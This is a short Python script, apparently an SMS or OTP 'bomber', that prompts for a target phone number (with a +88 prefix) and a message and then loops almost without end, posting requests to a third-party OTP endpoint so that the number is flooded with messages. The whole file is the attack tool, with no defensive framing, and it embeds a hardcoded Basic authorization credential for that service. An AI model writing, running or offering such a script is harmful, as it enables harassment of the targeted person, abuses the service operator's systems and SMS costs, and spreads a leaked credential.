import requests
import time 


number=str(input("\[>]	Enter Your Target Number: "))
n=str(input("\[>]	Write Message : "))

url = "https://softmaxmanager.xyz/api/v1/user/request/otp/"


headers = {"content-type":"application/x-www-form-urlencoded; charset=utf-8",
"authorization":"Basic c29zOjI3TTMjYTRz"}


data="phone_number=%2B88"+number+"&app_signature="+n
for i in range(999999999999999999999999999):
	try:	
		x = requests.post(url, headers=headers, data=data)
		
		
		print("\t\t\t"+str([ i+1])+"\n"+x.text)
	except:
		print(" make sure your internet connection")